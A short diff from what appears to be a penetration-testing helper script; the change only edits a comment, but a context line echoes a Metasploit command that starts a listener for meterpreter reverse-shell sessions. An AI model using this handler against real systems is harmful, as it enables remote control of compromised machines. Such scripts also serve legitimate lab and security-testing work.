@@ -94,7 +94,7 @@ info "10) Handler with session logging"
 echo "    msfconsole -q -x \"use exploit/multi/handler; set PAYLOAD linux/x64/meterpreter/reverse_tcp; set LHOST ${LHOST}; set LPORT ${LPORT}; set SessionCommunicationTimeout 0; set ExitOnSession false; exploit -j\""
 echo ""
 
-# Interactive demo (skip if non-interactive, e.g. running via make)
+# Interactive demo (skip if non-interactive)
 [[ ! -t 0 ]] && exit 0
 
 echo ""
